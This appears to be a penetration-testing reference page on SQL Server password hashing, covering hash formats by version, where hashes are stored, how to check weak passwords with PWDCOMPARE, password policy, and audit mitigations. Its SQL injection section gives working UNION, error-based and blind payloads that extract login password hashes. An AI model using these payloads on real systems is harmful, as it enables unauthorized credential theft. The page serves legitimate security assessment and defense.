---
title: Password Hashing
description: Understanding password hashing mechanisms in Microsoft SQL Server
category: Authentication
order: 17
tags: ["password hashing", "authentication", "security"]
lastUpdated: 2026-10-08
---

Microsoft SQL Server uses various password hashing algorithms depending on the version and authentication method. Understanding these mechanisms is important for security assessment and potential password cracking during penetration testing.

## SQL Server Authentication Types

SQL Server supports two primary authentication modes:

1. **Windows Authentication**: Uses Windows credentials, no passwords stored in SQL Server
2. **SQL Server Authentication**: Uses username/password stored within SQL Server

## Password Storage Evolution

Password storage in SQL Server has evolved over time. Every hash uses a random 4-byte salt and the password encoded as UTF-16LE; the first two bytes give the format version:

| SQL Server Version      | Header   | Hashing Algorithm                                     | Length   |
| ----------------------- | -------- | ----------------------------------------------------- | -------- |
| SQL Server 2000         | `0x0100` | SHA-1, plus a second SHA-1 of the uppercased password | 46 bytes |
| SQL Server 2005-2008 R2 | `0x0100` | SHA-1 (case-sensitive password only)                  | 26 bytes |
| SQL Server 2012-2022    | `0x0200` | SHA-512                                               | 70 bytes |
| SQL Server 2025         | `0x0300` | PBKDF2 (RFC 2898) with SHA-512, 100,000 iterations    | 70 bytes |

The uppercase hash in the SQL Server 2000 format makes it much weaker: cracking the case-insensitive half first and then trying case variations is fast. Hashes created on an older version keep their format after an upgrade until the password is changed. SQL Server 2022 CU12 and later can also write `0x0300` hashes when a sysadmin enables trace flag 4671 (off by default).

## SQL Server Password Hash Locations

SQL Server stores password hashes in several system tables:

```sql
-- Main location for SQL Server logins (2005+)
SELECT name, password_hash FROM sys.sql_logins;

-- SQL Server 2000 only (the table was removed in 2005)
SELECT name, password FROM master.dbo.sysxlogins;

-- SQL Server 2000: compatibility view over sysxlogins (2005+: password is always NULL)
SELECT name, password FROM master.dbo.syslogins;
```

Any login can query `sys.sql_logins`, but it only sees its own login and `sa`, and `password_hash` is `NULL` unless the caller has `CONTROL SERVER` (sysadmin) or, on SQL Server 2022 and later, `VIEW ANY CRYPTOGRAPHICALLY SECURED DEFINITION`. `VIEW ANY DEFINITION` shows every login but still not the hashes.

## Password Hash Format

SQL Server password hashes have specific formats:

### SQL Server 2000

```plaintext
0x0100[4-byte salt][SHA-1 of password + salt][SHA-1 of UPPER(password) + salt]
```

### SQL Server 2005 to 2008 R2

```plaintext
0x0100[4-byte salt][SHA-1 of password + salt]
```

Example (password `password`, salt `4086CEB6`): `0x01004086CEB6E0BC04FE5027A51DF29E1CF0B74DD3C33214D9DB` (26 bytes)

## SQL Server 2012+ Format

```plaintext
0x0200[4-byte salt][SHA-512 of password + salt]
```

Example: `0x020093F7305CD8301C7D767C1A9D48A9180B30DB11978AC3E0052265A8BB4969B264C09270C4EB9129E844FB5B1AA1125214DF28914A638CA784159F05C1AE5834F72F51F221` (70 bytes)

The format consists of:

- `0x0200`: Version identifier
- Next 4 bytes: The salt (`93F7305C` in the example)
- Remaining 64 bytes: SHA-512 of the UTF-16LE password followed by the salt

SQL Server 2025 replaces this with an iterated PBKDF2 hash (header `0x0300`, same 70-byte layout), which slows down cracking considerably.

## Extracting Password Hashes

With appropriate permissions, password hashes can be extracted:

```sql
-- Basic extraction with sysadmin privileges (password_hash is varbinary)
SELECT name, password_hash FROM sys.sql_logins;

-- Converting to a hex string with the 0x prefix (style 1, SQL Server 2008+)
SELECT name, CONVERT(varchar(max), password_hash, 1) FROM sys.sql_logins;

-- Converting to a hex string without the prefix (style 2)
SELECT name, CONVERT(varchar(max), password_hash, 2) FROM sys.sql_logins;
```

On SQL Server 2005, which has no binary styles for `CONVERT`, use `master.dbo.fn_varbintohexstr(password_hash)`.

## Checking Passwords with PWDCOMPARE

`PWDCOMPARE(clear_text, hash)` returns 1 when the password matches the hash, so weak passwords can be tested inside the database without exporting the hashes (it needs the same access to `password_hash`). `PWDENCRYPT(clear_text)` returns a hash in the current server's format.

```sql
-- Logins with a blank password or a password equal to the login name
SELECT name FROM sys.sql_logins
WHERE PWDCOMPARE('', password_hash) = 1 OR PWDCOMPARE(name, password_hash) = 1;
```

## SQL Server Authentication Process

When a user attempts to log in:

1. Client sends the username and password
2. SQL Server retrieves the stored salt for that user
3. Computes the hash using the provided password and stored salt
4. Compares the computed hash with the stored hash
5. Grants access if they match

## Password Policy Enforcement

SQL Server can enforce Windows password policies:

```sql
-- Create a login with password policy enforcement
CREATE LOGIN TestUser WITH PASSWORD = 'StrongPwd123!',
    CHECK_POLICY = ON,
    CHECK_EXPIRATION = ON;

-- Check policy status for logins
SELECT name, is_policy_checked, is_expiration_checked
FROM sys.sql_logins;
```

Policies can include:

- Minimum password length
- Password complexity requirements
- Password history
- Maximum password age

## SQL Server Password Salting

SQL Server uses salting to prevent dictionary and rainbow table attacks:

1. Each password gets a unique salt
2. The salt is stored with the password hash
3. Even identical passwords produce different hash values

Example of how salting works:

```plaintext
User1: Password "Password123" + Salt "ABCDEF" = Hash1
User2: Password "Password123" + Salt "XYZABC" = Hash2
```

Even though both users have the same password, the stored hashes are different.

## Practical SQL Injection Examples

If the application connects with a sysadmin login (or one with the permissions above), you can extract hashes. String context (`WHERE username = '<input>'`); the UNION example assumes 3 columns, the last two strings. Convert the hash with style 1: casting `varbinary` to `nvarchar` produces unreadable characters instead of hex.

```sql
-- UNION attack to extract hashes
' UNION SELECT NULL, name, CONVERT(varchar(max), password_hash, 1) FROM sys.sql_logins--

-- Error-based extraction: the conversion error shows 'sa:0x0200...'
' AND 1=CONVERT(int, (SELECT TOP 1 name + ':' + CONVERT(varchar(max), password_hash, 1) FROM sys.sql_logins))--

-- Blind extraction: characters 3-6 of the hex string are the version header (needs a valid value before the quote)
admin' AND SUBSTRING((SELECT CONVERT(varchar(max), password_hash, 1) FROM sys.sql_logins WHERE name = 'sa'), 3, 4) = '0200'--
```

## Detecting Weak Password Implementations

Some signs of weak password storage:

1. No CHECK_POLICY enforcement
2. Hashes still in the `0x0100` (SHA-1) format, from logins created on SQL Server 2008 R2 or earlier and never changed
3. Using third-party applications with custom authentication that may store passwords insecurely

To check password policy enforcement:

```sql
-- Check which logins don't have password policies enforced
SELECT name FROM sys.sql_logins WHERE is_policy_checked = 0;
```

## Password Storage Best Practices

To secure SQL Server passwords:

1. Use Windows Authentication when possible to avoid storing passwords in SQL Server
2. Enable CHECK_POLICY and CHECK_EXPIRATION for all SQL logins
3. Use strong password complexity requirements
4. Use group managed service accounts (gMSA) with Windows Authentication for application connections
5. Change passwords after upgrading, so the hashes are regenerated in the current format
6. Use SQL Server 2025 or later (or 2022 CU12+ with trace flag 4671) for the iterated PBKDF2 hashing
7. Regularly audit for weak password configurations

```sql
-- Setting strong password policies
CREATE LOGIN SecureUser WITH PASSWORD = 'C0mpl3xP@$$w0rd!',
    CHECK_POLICY = ON,
    CHECK_EXPIRATION = ON,
    DEFAULT_DATABASE = master;
```

## Mitigations Against Hash Theft

To protect against password hash theft:

1. Use least privilege principles for database access
2. Never let applications connect as sysadmin, and do not grant them `CONTROL SERVER` or `VIEW ANY CRYPTOGRAPHICALLY SECURED DEFINITION`
3. Protect backups and data files of `master`: TDE cannot encrypt the system databases, so it does not protect login hashes
4. Implement endpoint protection for the SQL Server machine
5. Use SQL Server Audit to monitor reads of `sys.sql_logins`

The audit specification must be created in `master` (use a Linux path such as `/var/opt/mssql/data/` on SQL Server on Linux):

```sql
-- Create audit to track access to login information
USE master;
CREATE SERVER AUDIT SecurityAudit TO FILE (FILEPATH = 'C:\Audits\');

CREATE DATABASE AUDIT SPECIFICATION LoginAudit
FOR SERVER AUDIT SecurityAudit
ADD (SELECT ON sys.sql_logins BY public);

ALTER SERVER AUDIT SecurityAudit WITH (STATE = ON);
ALTER DATABASE AUDIT SPECIFICATION LoginAudit WITH (STATE = ON);
```
